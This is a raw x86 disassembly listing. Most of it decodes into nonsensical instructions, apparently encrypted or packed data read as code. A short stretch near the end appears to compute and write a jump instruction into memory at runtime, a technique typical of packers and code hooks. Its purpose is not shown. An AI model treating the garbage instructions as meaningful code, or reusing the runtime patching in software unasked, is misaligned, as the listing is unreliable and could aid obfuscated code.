  4030d4:	ss mov dl,0xd5
  4030d7:	mov    dl,0x29
  4030d9:	ror    DWORD PTR [ecx+0x1c50fed9],cl
  4030df:	and    al,0xef
  4030e1:	and    al,BYTE PTR [ebx+0x5ddd04c4]
  4030e7:	scas   al,BYTE PTR es:[edi]
  4030e8:	push   edx
  4030e9:	push   0xffffffad
  4030eb:	loope  0x4030bb
  4030ed:	iret   
  4030ee:	call   0xfc19:0x89960e85
  4030f5:	aam    0x54
  4030f7:	imul   esp,DWORD PTR [ebp-0x63],0xffffffbf
  4030fb:	scas   eax,DWORD PTR es:[edi]
  4030fc:	sti    
  4030fd:	and    BYTE PTR [esi],dl
  4030ff:	push   eax
  403100:	dec    ebx
  403101:	rcl    DWORD PTR [esi+edx*8-0x4758d8f7],1
  403108:	sti    
  403109:	inc    eax
  40310a:	nop
  40310b:	inc    ecx
  40310c:	sub    ch,BYTE PTR [ebp-0x4673621c]
  403112:	pop    edx
  403113:	push   0x40
  403115:	std    
  403116:	sbb    ecx,DWORD PTR [ecx+0x71e4f703]
  40311c:	dec    edi
  40311d:	int3   
  40311e:	outs   dx,DWORD PTR ds:[esi]
  40311f:	cli    
  403120:	xor    ch,BYTE PTR [ebp-0x56]
  403123:	jb     0x40313d
  403125:	dec    ecx
  403126:	icebp  
  403127:	dec    ebp
  403128:	das    
  403129:	push   edx
  40312a:	inc    eax
  40312b:	fwait
  40312c:	mov    ah,0x8
  40312e:	adc    eax,0xc64491b4
  403133:	inc    ebp
  403134:	jmp    0xe1442ab8
  403139:	mov    bl,0x5c
  40313b:	cld    
  40313c:	inc    ebx
  40313d:	repnz lahf 
  40313f:	sar    DWORD PTR [edx-0x2ee12669],cl
  403145:	(bad)  
  403146:	adc    eax,0xa380fa59
  40314b:	push   es
  40314c:	xor    eax,0xd4f6a3c9
  403151:	sub    esp,DWORD PTR [edi-0x30]
  403154:	push   esp
  403155:	sub    eax,0x697ff638
  40315a:	push   0x47493299
  40315f:	xchg   ebp,eax
  403160:	js     0x403108
  403162:	aaa    
  403163:	jne    0x403147
  403165:	add    eax,edx
  403167:	shl    DWORD PTR [edx],1
  403169:	or     eax,0xabfa90ab
  40316e:	ffreep st(6)
  403170:	sahf   
  403171:	lock (bad) 
  403173:	stc    
  403174:	push   0x70f99282
  403179:	fiadd  DWORD PTR [eax]
  40317b:	and    bl,BYTE PTR [esi+0x30]
  40317e:	push   0xffffffb2
  403180:	mov    ah,0x6c
  403182:	xchg   ebx,eax
  403183:	scas   eax,DWORD PTR es:[edi]
  403184:	push   0xc0ffc95f
  403189:	xchg   edi,eax
  40318a:	scas   al,BYTE PTR es:[edi]
  40318b:	push   ecx
  40318c:	xchg   DWORD PTR [eax+0x2e],ebp
  40318f:	cmp    DWORD PTR [edi+0x3e43eab9],ebx
  403195:	in     eax,dx
  403196:	xchg   edx,eax
  403197:	xchg   esp,eax
  403198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403199:	fisttp WORD PTR [esi+edx*4-0x29]
  40319d:	minps  xmm1,XMMWORD PTR [eax+edi*4-0x8072726]
  4031a5:	dec    ebx
  4031a6:	jecxz  0x403198
  4031a8:	ss dec ecx
  4031aa:	or     DWORD PTR cs:[ebx+0x4c],0xffffff80
  4031af:	jns    0x403140
  4031b1:	out    0x33,eax
  4031b3:	cwde   
  4031b4:	(bad)
  4031b7:	popf   
  4031b8:	arpl   bx,cx
  4031ba:	adc    BYTE PTR [esi],cl
  4031bc:	in     eax,0x5b
  4031be:	mov    edi,0x171226ec
  4031c3:	mov    bl,0x0
  4031c5:	sbb    eax,0xd1550644
  4031ca:	sti    
  4031cb:	clc    
  4031cc:	jl     0x403188
  4031ce:	into   
  4031cf:	lea    esp,[edi]
  4031d1:	and    eax,0xf2dc7eea
  4031d6:	(bad)
  4031d9:	pop    es
  4031da:	ret    0x12b4
  4031dd:	ins    BYTE PTR es:[edi],dx
  4031de:	je     0x403204
  4031e0:	jne    0x4031fb
  4031e2:	dec    eax
  4031e3:	mov    ah,0x23
  4031e5:	cmp    al,0xe4
  4031e7:	adc    al,0xb2
  4031e9:	dec    DWORD PTR [eax+0x74]
  4031ec:	jmp    0xd38b:0x8a8cf474
  4031f3:	sbb    eax,DWORD PTR [edi+edi*8-0x53]
  4031f7:	aam    0xef
  4031f9:	mov    al,0x9c
  4031fb:	das    
  4031fc:	scas   eax,DWORD PTR es:[edi]
  4031fd:	xor    al,0x3f
  4031ff:	mov    eax,ds:0x5c8fded7
  403204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403205:	mov    dh,0xd6
  403207:	and    ebx,edx
  403209:	cli    
  40320a:	push   esp
  40320b:	jae    0x4031a1
  40320d:	je     0x40328e
  40320f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403210:	inc    eax
  403211:	call   0x269b73b
  403216:	push   esp
  403217:	inc    ebp
  403218:	fimul  WORD PTR [edi+0x6902b96b]
  40321e:	stos   DWORD PTR es:[edi],eax
  40321f:	cmc    
  403220:	out    dx,eax
  403221:	popa   
  403222:	jp     0x403249
  403224:	retf   
  403225:	pop    edi
  403226:	adc    al,BYTE PTR [ebp-0x34e2d908]
  40322c:	ror    BYTE PTR [esi],1
  40322e:	stos   BYTE PTR es:[edi],al
  40322f:	or     DWORD PTR [eax+0x84e1c59],ecx
  403235:	inc    edx
  403236:	pusha  
  403237:	xchg   edi,eax
  403238:	lods   al,BYTE PTR ds:[esi]
  403239:	sub    BYTE PTR [edi],cl
  40323b:	in     al,dx
  40323c:	fidivr DWORD PTR [esi+0x6e55c134]
  403242:	add    eax,ebx
  403244:	leave  
  403245:	inc    esi
  403246:	aad    0x20
  403248:	adc    eax,0xbd10b415
  40324d:	test   al,0x14
  40324f:	xor    dl,ch
  403251:	je     0x403245
  403253:	jno    0x403230
  403255:	mov    dl,0x22
  403257:	inc    ebx
  403258:	ret    
  403259:	or     eax,0x7740385e
  40325e:	fadd   st(4),st
  403260:	rcr    BYTE PTR ds:0xe57f3303,cl
  403266:	int    0xe8
  403268:	jbe    0x4032e7
  40326a:	in     al,0xc5
  40326c:	fld    st(1)
  40326e:	leave  
  40326f:	ins    DWORD PTR es:[edi],dx
  403270:	inc    ebp
  403271:	loope  0x40329f
  403273:	or     al,0xe5
  403275:	repz mov bl,0xee
  403278:	(bad)  
  403279:	cmc    
  40327a:	arpl   ax,sp
  40327c:	jae    0x4032bf
  40327e:	cmp    eax,0x914a53f
  403283:	pop    ecx
  403284:	clc    
  403285:	rcr    al,1
  403287:	mov    al,ds:0x9c1f983e
  40328c:	pop    esi
  40328d:	jle    0x403250
  40328f:	mov    ah,0xf9
  403291:	or     edx,eax
  403293:	pop    es
  403294:	inc    ebp
  403295:	cmp    BYTE PTR [esi+0x6cd79ca1],al
  40329b:	jne    0x4032bd
  40329d:	push   ds
  40329e:	pop    esp
  40329f:	inc    ebp
  4032a0:	pusha  
  4032a1:	ficomp DWORD PTR [eax-0x63]
  4032a4:	jnp    0x403323
  4032a6:	jno    0x4032c5
  4032a8:	je     0x4032b0
  4032aa:	pop    ds
  4032ab:	pushf  
  4032ac:	pop    ebp
  4032ad:	and    eax,0x4e2267db
  4032b2:	in     al,dx
  4032b3:	sahf   
  4032b4:	mov    esi,0x139a0533
  4032b9:	cmp    al,0x9b
  4032bb:	lock cmp DWORD PTR [eax+0x410c85a1],ecx
  4032c2:	out    0xc0,al
  4032c4:	mov    dh,BYTE PTR [edx+0x25]
  4032c7:	adc    DWORD PTR [ebx],ecx
  4032c9:	xor    dl,dl
  4032cb:	xor    DWORD PTR [edi],esp
  4032cd:	mov    ah,BYTE PTR [ebx]
  4032cf:	call   0x1eb9:0x3646d130
  4032d6:	xor    eax,0x70ea0c4b
  4032db:	push   ebp
  4032dc:	pop    edx
  4032dd:	jmp    0xad93ce9e
  4032e2:	jne    0x403307
  4032e4:	sub    al,0xa0
  4032e6:	in     al,dx
  4032e7:	lods   al,BYTE PTR ds:[esi]
  4032e8:	mov    dh,0xd
  4032ea:	aam    0x7f
  4032ec:	or     eax,0x39e7bb98
  4032f1:	xchg   ebx,eax
  4032f2:	adc    bh,ah
  4032f4:	or     BYTE PTR es:[ecx],cl
  4032f7:	sbb    ebx,DWORD PTR [esi-0x274e80b6]
  4032fd:	pop    ebp
  4032fe:	test   al,0x85
  403300:	xor    ebp,DWORD PTR [esi-0x6a]
  403303:	mov    ah,BYTE PTR [ecx]
  403305:	pushf  
  403306:	adc    al,0x12
  403308:	in     eax,dx
  403309:	cmp    al,0x14
  40330b:	jnp    0x40329e
  40330d:	in     eax,dx
  40330e:	pop    edx
  40330f:	cmp    BYTE PTR [eax-0x63],ah
  403312:	sti    
  403313:	mov    eax,0x7ae95a52
  403318:	in     eax,0x17
  40331a:	in     al,0x7b
  40331c:	es popa 
  40331e:	jns    0x403379
  403320:	inc    esp
  403321:	add    DWORD PTR [ebp+0x56],esp
  403324:	les    edx,FWORD PTR [eax+0x74]
  403327:	mov    DWORD PTR [eax-0x6f],esi
  40332a:	in     eax,dx
  40332b:	dec    ebp
  40332c:	rdmsr  
  40332e:	and    al,0xd1
  403330:	repnz xchg esi,eax
  403332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403333:	mov    eax,ds:0x22c73b07
  403338:	(bad)  
  403339:	imul   esp,DWORD PTR [eax+edi*1],0x78
  40333d:	dec    eax
  40333e:	ret    0x9309
  403341:	add    al,0x2a
  403343:	cmp    DWORD PTR [ebx-0x5e65245e],ebx
  403349:	add    bh,cl
  40334b:	mov    ds:0x2720f3a4,eax
  403350:	sub    al,0x8a
  403352:	add    eax,0x3b3b256d
  403357:	add    eax,0xb4e9ba74
  40335c:	pop    ecx
  40335d:	outs   dx,BYTE PTR ds:[esi]
  40335e:	or     DWORD PTR [esi+eiz*4],esi
  403361:	in     al,0x11
  403363:	xor    cl,al
  403365:	dec    esi
  403366:	bnd jmp 0x6d79546
  40336c:	jecxz  0x4033bb
  40336e:	xor    esi,esi
  403370:	adc    dl,BYTE PTR [edi+0x62]
  403373:	sbb    dh,ah
  403375:	pusha  
  403376:	and    eax,0xbc430bb8
  40337b:	xchg   edx,eax
  40337c:	out    0x7,eax
  40337e:	cs dec ebp
  403380:	mov    eax,ds:0x7de93608
  403385:	inc    edi
  403386:	mov    eax,ds:0x62c7cfbd
  40338b:	jns    0x40335d
  40338d:	loopne 0x403345
  40338f:	sub    al,0x37
  403391:	add    dl,cl
  403393:	pop    edx
  403394:	in     al,dx
  403395:	out    0x4c,eax
  403397:	fistp  WORD PTR [edx+0x54a300a4]
  40339d:	loop   0x4033c5
  40339f:	cmp    ebp,DWORD PTR [ecx]
  4033a1:	sub    al,0xd3
  4033a3:	sub    al,0x9c
  4033a5:	repz cdq 
  4033a7:	lods   al,BYTE PTR ds:[esi]
  4033a8:	jle    0x403333
  4033aa:	cmp    eax,0xfd25a2fa
  4033af:	jae    0x403401
  4033b1:	es ins DWORD PTR es:[edi],dx
  4033b3:	jl     0x4033bc
  4033b5:	xlat   BYTE PTR ds:[ebx]
  4033b6:	repnz xchg ecx,eax
  4033b8:	imul   ecx,DWORD PTR [esp+ebp*4],0xb0e48cf
  4033bf:	sbb    dh,BYTE PTR [esi-0x5e]
  4033c2:	xchg   edi,eax
  4033c3:	add    eax,0xfe42439
  4033c8:	mov    ecx,0x4583653c
  4033cd:	add    al,0xa3
  4033cf:	call   0xa7021c42
  4033d4:	add    al,0xe
  4033d6:	daa    
  4033d7:	ja     0x403456
  4033d9:	int    0xa6
  4033db:	inc    esi
  4033dc:	adc    esp,DWORD PTR [ebx-0xfb6a78a]
  4033e2:	pop    ebx
  4033e3:	mov    ds:0x6e36c90a,al
  4033e8:	add    ah,ah
  4033ea:	fcomi  st,st(4)
  4033ec:	repz lahf 
  4033ee:	xchg   esi,eax
  4033ef:	pop    ds
  4033f0:	mov    BYTE PTR [ebx],dl
  4033f2:	aam    0xa1
  4033f4:	pop    esp
  4033f5:	ss or  al,0xf5
  4033f8:	sbb    DWORD PTR [edi-0x5e8fbcd6],ebp
  4033fe:	adc    BYTE PTR [edi],bh
  403400:	xor    DWORD PTR [ecx+eax*4+0x49],0xffffffe4
  403405:	pop    edi
  403406:	jns    0x4033fa
  403408:	jnp    0x403470
  40340a:	gs das 
  40340c:	repnz loope 0x403475
  40340f:	adc    eax,DWORD PTR ss:[ecx+0x37]
  403413:	cld    
  403414:	mov    ds:0xe03c35f2,eax
  403419:	fistp  WORD PTR [ebp+0x4a]
  40341c:	pop    ebx
  40341d:	sub    al,0x6c
  40341f:	out    0x7d,al
  403421:	clc    
  403422:	pop    ecx
  403423:	rcl    BYTE PTR [ecx-0x64],0x7b
  403427:	sbb    dh,ch
  403429:	rol    DWORD PTR [ebx-0x6b02fc64],0x2a
  403430:	lea    ecx,[edi-0x53e4b99e]
  403436:	push   esi
  403437:	popa   
  403438:	adc    al,0xc7
  40343a:	sub    esi,DWORD PTR [ecx]
  40343c:	mov    edx,0x13f918c
  403441:	dec    ebp
  403442:	pop    edx
  403443:	aad    0x82
  403445:	jno    0x4034ba
  403447:	sti    
  403448:	ins    DWORD PTR es:[edi],dx
  403449:	xchg   esp,eax
  40344a:	inc    edi
  40344b:	lds    edx,FWORD PTR [eax]
  40344d:	cmc    
  40344e:	mov    ebx,0xb2c607a6
  403453:	out    0x9e,al
  403455:	cwde   
  403456:	retf   
  403457:	pop    ebx
  403458:	jae    0x403425
  40345a:	rol    BYTE PTR [ecx],cl
  40345c:	sar    BYTE PTR [ebp+0x2b5bd456],0xac
  403463:	inc    esi
  403464:	sar    DWORD PTR [edx+0x62],cl
  403467:	push   cs
  403468:	xchg   ebp,eax
  403469:	nop    DWORD PTR [ebp+0x5fa070a]
  403470:	pop    ebx
  403471:	push   ss
  403472:	adc    eax,0x4a234420
  403477:	jne    0x40344d
  403479:	dec    ebx
  40347a:	neg    DWORD PTR [edx+0x73]
  40347d:	pop    eax
  40347e:	and    ecx,ebp
  403480:	inc    ebx
  403481:	aam    0xb8
  403483:	add    BYTE PTR ds:0x2874a4d7,al
  403489:	pushf  
  40348a:	ret    0xe54a
  40348d:	cdq    
  40348e:	rcr    DWORD PTR [ebp+0x7aa87601],0x3c
  403495:	xor    eax,0x65548da0
  40349a:	sub    eax,esp
  40349c:	cli    
  40349d:	ret    
  40349e:	enter  0x4009,0x10
  4034a2:	adc    al,0x27
  4034a4:	push   esp
  4034a5:	dec    edx
  4034a6:	daa    
  4034a7:	push   esp
  4034a8:	mov    edx,DWORD PTR [ebp+0x7a]
  4034ab:	mov    edx,0x8d374af0
  4034b0:	shl    bl,cl
  4034b2:	int    0xc3
  4034b4:	out    dx,al
  4034b5:	(bad)  
  4034b6:	leave  
  4034b7:	cmp    eax,0x59610214
  4034bc:	call   0x79d1f886
  4034c1:	das    
  4034c2:	in     al,dx
  4034c3:	test   BYTE PTR [edi],bl
  4034c5:	clc    
  4034c6:	std    
  4034c7:	and    BYTE PTR [ebx+0x22],cl
  4034ca:	int    0xdc
  4034cc:	sub    BYTE PTR [esi+0x5f],al
  4034cf:	sbb    BYTE PTR [ebx+0xe],dh
  4034d2:	cs sti 
  4034d4:	and    ebx,DWORD PTR [ebp-0x6b80136c]
  4034da:	in     eax,dx
  4034db:	push   ebx
  4034dc:	jns    0x403483
  4034de:	enter  0x922d,0x42
  4034e2:	and    al,0xb6
  4034e4:	lock inc esi
  4034e6:	sahf   
  4034e7:	sub    BYTE PTR [edx],ah
  4034e9:	xor    eax,0x819eddc8
  4034ee:	ins    DWORD PTR es:[edi],dx
  4034ef:	mov    ds:0x91f90b50,eax
  4034f4:	mov    bl,0xa5
  4034f6:	xor    bh,BYTE PTR [esi+ebx*4-0x19]
  4034fa:	fisubr WORD PTR [edx-0x19b1c0c0]
  403500:	mov    BYTE PTR [ebx+0x18119685],bh
  403506:	xor    ch,dl
  403508:	mov    ebp,0xa8e20525
  40350d:	mov    ebx,0x2157e2be
  403512:	stos   DWORD PTR es:[edi],eax
  403513:	les    esi,FWORD PTR [esi+0x79]
  403516:	inc    esp
  403517:	add    al,0x75
  403519:	xor    eax,DWORD PTR [ebx+0x43]
  40351c:	push   ebx
  40351d:	clc    
  40351e:	ret    0x96d5
  403521:	call   0x9735:0x1b59950a
  403528:	stc    
  403529:	xchg   esi,eax
  40352a:	inc    esp
  40352b:	adc    BYTE PTR [ebx-0xa9b746e],0xac
  403532:	nop
  403533:	pop    ecx
  403534:	int3   
  403535:	pop    eax
  403536:	scas   eax,DWORD PTR es:[edi]
  403537:	or     edi,DWORD PTR [esp+ebp*1-0x1d]
  40353b:	retf   
  40353c:	sti    
  40353d:	imul   edx,edx,0xffffffa0
  403540:	add    ebx,DWORD PTR [ebp-0x42]
  403543:	or     ax,ax
  403546:	cmp    BYTE PTR [edi-0x2a],cl
  403549:	cmc    
  40354a:	push   ebp
  40354b:	cmp    DWORD PTR [ecx+0x33335212],0x24
  403552:	mov    WORD PTR [ecx+0x867d918],gs
  403558:	add    al,0x50
  40355a:	jecxz  0x40359f
  40355c:	arpl   WORD PTR [eax],bp
  40355e:	cwde   
  40355f:	fwait
  403560:	sahf   
  403561:	fiadd  WORD PTR [edi+eax*8-0x4982fbcf]
  403568:	push   edi
  403569:	xchg   esi,eax
  40356a:	dec    edi
  40356b:	adc    DWORD PTR [edi-0x1ba3fec5],0x4b
  403572:	sar    bh,0x16
  403575:	addr16 aad 0x46
  403578:	loopne 0x4035d5
  40357a:	pushf  
  40357b:	dec    edx
  40357c:	mov    dh,0xf
  40357e:	sbb    BYTE PTR [ecx],ah
  403580:	inc    edx
  403581:	mov    bh,0xef
  403583:	pop    ecx
  403584:	xor    BYTE PTR [edi+0x43],dh
  403587:	adc    BYTE PTR [eax],dl
  403589:	out    dx,al
  40358a:	adc    BYTE PTR [eax-0x52],0x21
  40358e:	dec    edx
  40358f:	push   ds
  403590:	out    0x73,eax
  403592:	or     esp,DWORD PTR [edx+0x5479cc6b]
  403598:	xor    eax,0xda357e36
  40359d:	jle    0x403522
  40359f:	cwde   
  4035a0:	cmp    eax,0x9debc603
  4035a5:	dec    edi
  4035a6:	addr16 call 0xb908:0xa520292a
  4035ae:	pop    ds
  4035af:	lods   eax,DWORD PTR ds:[esi]
  4035b0:	cli    
  4035b1:	shl    BYTE PTR [esi+0x6e],cl
  4035b4:	pop    edx
  4035b5:	test   esi,ebx
  4035b7:	jnp    0x4035bf
  4035b9:	retf   
  4035ba:	mov    esi,0x6ad627df
  4035bf:	jmp    0x403604
  4035c1:	push   es
  4035c2:	push   ebp
  4035c3:	push   ecx
  4035c4:	cld    
  4035c5:	inc    esp
  4035c6:	outs   dx,DWORD PTR ds:[esi]
  4035c7:	sub    eax,0x66785058
  4035cc:	or     eax,0xba56f5e8
  4035d1:	mov    BYTE PTR [edi+0x32ef949d],dh
  4035d7:	in     eax,0x2d
  4035d9:	xor    DWORD PTR [ecx+eiz*8-0x63],ecx
  4035dd:	gs cwde 
  4035df:	cmp    al,BYTE PTR ds:[eax]
  4035e2:	retf   
  4035e3:	push   0x697d8810
  4035e8:	mov    ebx,0x2dd1fe8a
  4035ed:	dec    ecx
  4035ee:	pushf  
  4035ef:	jb     0x4035a5
  4035f1:	jle    0x4035d1
  4035f3:	leave  
  4035f4:	jno    0x403597
  4035f6:	(bad)  
  4035f7:	clc    
  4035f8:	mov    ecx,0x184420d8
  4035fd:	(bad)  
  4035fe:	sti    
  4035ff:	pop    ebx
  403600:	shl    BYTE PTR [edi+0x6076fbfe],0x7
  403607:	sar    BYTE PTR [edi+0x14],cl
  40360a:	cwde   
  40360b:	add    eax,0x962c6974
  403610:	inc    ecx
  403611:	es mov bl,0x6e
  403614:	test   DWORD PTR [esi+ebp*2-0x1e],esp
  403618:	mov    ecx,0xd3c7650f
  40361d:	ret    
  40361e:	ja     0x40365a
  403620:	sub    al,0xc3
  403622:	inc    ebx
  403623:	sub    BYTE PTR [ebx],0x3c
  403626:	xchg   edx,eax
  403627:	dec    BYTE PTR [ecx+0x765118bc]
  40362d:	enter  0x2d78,0x33
  403631:	rcl    dh,1
  403633:	mov    bl,dl
  403635:	sbb    eax,ebp
  403637:	jmp    0x52b215ca
  40363c:	and    esp,DWORD PTR [eax+0x3f9d4f7b]
  403642:	pop    esp
  403643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403644:	in     al,0xab
  403646:	add    eax,ecx
  403648:	loop   0x40364f
  40364a:	cmp    eax,DWORD PTR [eax+0x1640ed1e]
  403650:	dec    esi
  403651:	or     ebx,ebx
  403653:	das    
  403654:	das    
  403655:	rol    DWORD PTR [eax-0x5a],cl
  403658:	dec    esp
  403659:	pop    ss
  40365a:	sub    DWORD PTR [edi+0x69],edi
  40365d:	in     eax,dx
  40365e:	add    BYTE PTR [ebp-0x2a],cl
  403661:	inc    ebp
  403662:	ficom  DWORD PTR [eax-0x1c]
  403665:	mov    ch,0x7b
  403667:	mov    esp,0xb7900fdf
  40366c:	inc    edx
  40366d:	sbb    ebx,ebp
  40366f:	and    eax,0xe897224d
  403674:	xchg   edi,eax
  403675:	mov    edx,0xfb16ad8a
  40367a:	dec    esp
  40367b:	and    BYTE PTR [ecx+esi*4],ch
  40367e:	mov    edi,0xa4e962bf
  403683:	ins    BYTE PTR es:[edi],dx
  403684:	and    eax,0x4e3bb6f
  403689:	in     eax,0x27
  40368b:	and    eax,0x68f5f1c2
  403690:	inc    eax
  403691:	clc    
  403692:	les    ebp,FWORD PTR [ebx-0x7e]
  403695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403696:	sub    DWORD PTR [edi],edi
  403698:	iret   
  403699:	jg     0x403668
  40369b:	dec    ebx
  40369c:	xor    al,0xf3
  40369e:	fsub   st(6),st
  4036a0:	loope  0x403628
  4036a2:	push   0x3d
  4036a4:	push   esi
  4036a5:	pop    eax
  4036a6:	bound  edx,QWORD PTR [ecx+0x11]
  4036a9:	adc    ecx,ebp
  4036ab:	hlt    
  4036ac:	cmp    ah,BYTE PTR [ebx]
  4036ae:	push   ebp
  4036af:	or     BYTE PTR [eax-0x2a],dh
  4036b2:	dec    ebx
  4036b3:	imul   eax,DWORD PTR [ecx+0x78a42136],0x5089844c
  4036bd:	cmp    al,0xb8
  4036bf:	cmp    BYTE PTR [ebp+0x5555c76c],dl
  4036c5:	das    
  4036c6:	hlt    
  4036c7:	arpl   bx,cx
  4036c9:	test   al,0x35
  4036cb:	jo     0x403726
  4036cd:	lods   al,BYTE PTR gs:[esi]
  4036cf:	cmp    BYTE PTR [ecx],ch
  4036d1:	inc    edi
  4036d2:	(bad)
  4036d7:	sub    ecx,ebx
  4036d9:	lahf   
  4036da:	pop    esi
  4036db:	jge    0x4036ff
  4036dd:	popf   
  4036de:	xchg   esi,eax
  4036df:	imul   ebx,DWORD PTR [ecx-0x28],0x1f
  4036e3:	jge    0x40366c
  4036e5:	(bad)  
  4036e6:	pusha  
  4036e7:	fninit 
  4036e9:	push   ebx
  4036ea:	in     al,0x1
  4036ec:	(bad)  
  4036ed:	cmp    BYTE PTR [ecx+0x28],cl
  4036f0:	xlat   BYTE PTR ds:[ebx]
  4036f1:	mov    al,0x1
  4036f3:	xor    ebp,DWORD PTR [eax]
  4036f5:	sbb    al,BYTE PTR [esi]
  4036f7:	fwait
  4036f8:	dec    ebp
  4036f9:	dec    ebx
  4036fa:	add    al,0x96
  4036fc:	xor    bl,al
  4036fe:	cmp    esi,DWORD PTR [edx]
  403700:	push   ebx
  403701:	or     BYTE PTR [esi-0x17],ch
  403704:	or     BYTE PTR [edi],bh
  403706:	out    0xe1,eax
  403708:	add    eax,0x6f641fa2
  40370d:	test   eax,0x38b2d5dd
  403712:	lahf   
  403713:	mov    bl,0xc8
  403715:	into   
  403716:	mov    al,ds:0xc7c49545
  40371b:	scas   al,BYTE PTR es:[edi]
  40371c:	int    0xf1
  40371e:	repnz push ds
  403720:	shr    DWORD PTR [ebp-0x1d],1
  403723:	pop    esp
  403724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403725:	xor    al,0xbf
  403727:	outs   dx,BYTE PTR ds:[esi]
  403728:	mov    eax,0x86841b42
  40372d:	test   ebx,0xaf6be3d0
  403733:	aam    0x80
  403735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403736:	xchg   edi,eax
  403737:	int3   
  403738:	shr    DWORD PTR [ecx],cl
  40373a:	and    al,BYTE PTR [esp+eiz*4-0x3e]
  40373e:	(bad)  
  40373f:	iret   
  403740:	shr    BYTE PTR [edx],cl
  403742:	test   bh,0x3f
  403745:	inc    ebx
  403746:	xor    al,0x3c
  403748:	(bad)  
  40374a:	into   
  40374b:	lds    ecx,FWORD PTR [ecx]
  40374d:	mov    ebx,0x282c688b
  403752:	mov    ah,0x1b
  403754:	in     eax,dx
  403755:	ret    
  403756:	loope  0x40371d
  403758:	rcr    DWORD PTR [ebp-0x7c9e8072],0xfb
  40375f:	cmp    eax,0x57ecb0b0
  403764:	inc    esi
  403765:	stos   BYTE PTR es:[edi],al
  403766:	lock arpl WORD PTR es:[ebx],cx
  40376a:	mov    esp,0x84587092
  40376f:	and    edi,esp
  403771:	hlt    
  403772:	jb     0x403771
  403774:	dec    ebx
  403775:	dec    ecx
  403776:	dec    edi
  403777:	mov    dh,0xed
  403779:	inc    edx
  40377a:	xrelease mov BYTE PTR [esi-0x55],dh
  40377e:	pop    ebx
  40377f:	sub    al,0x18
  403781:	jae    0x4037f5
  403783:	adc    al,0xa9
  403785:	push   esi
  403786:	std    
  403787:	mov    ecx,0x1170525c
  40378c:	mov    ds:0xd4c2bc3,eax
  403791:	mov    eax,0x7c12e89
  403796:	popa   
  403797:	add    BYTE PTR [esi],cl
  403799:	(bad)
  40379c:	sbb    DWORD PTR es:[ebp-0x58510a7e],edx
  4037a3:	or     BYTE PTR [esi],cl
  4037a5:	enter  0xfef0,0x99
  4037a9:	cmp    al,0xe4
  4037ab:	imul   eax,DWORD PTR gs:[ebx+0x3d],0x3a
  4037b0:	push   ebx
  4037b1:	mov    BYTE PTR [ebx-0x23c908fd],cl
  4037b7:	jno    0x403805
  4037b9:	sar    BYTE PTR [esi],cl
  4037bb:	inc    esi
  4037bc:	lahf   
  4037bd:	mov    ebp,0xd2a01916
  4037c2:	mov    eax,ds:0xf0dd152c
  4037c7:	and    al,0x62
  4037ca:	out    dx,eax
  4037cb:	mov    cl,0x76
  4037cd:	nop
  4037ce:	jecxz  0x403848
  4037d0:	test   al,0x4c
  4037d2:	or     bh,BYTE PTR [edi+0x1e29c17e]
  4037d8:	mov    ah,ah
  4037da:	jle    0x403797
  4037dc:	jo     0x40377d
  4037de:	or     al,0xa1
  4037e0:	icebp  
  4037e1:	mov    eax,0x9a98981c
  4037e6:	in     al,dx
  4037e7:	aaa    
  4037e8:	jmp    0x4037a1
  4037ea:	jbe    0x40381a
  4037ec:	jne    0x4037c8
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fsub   QWORD PTR fs:[ebx-0x223e179c]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x32]
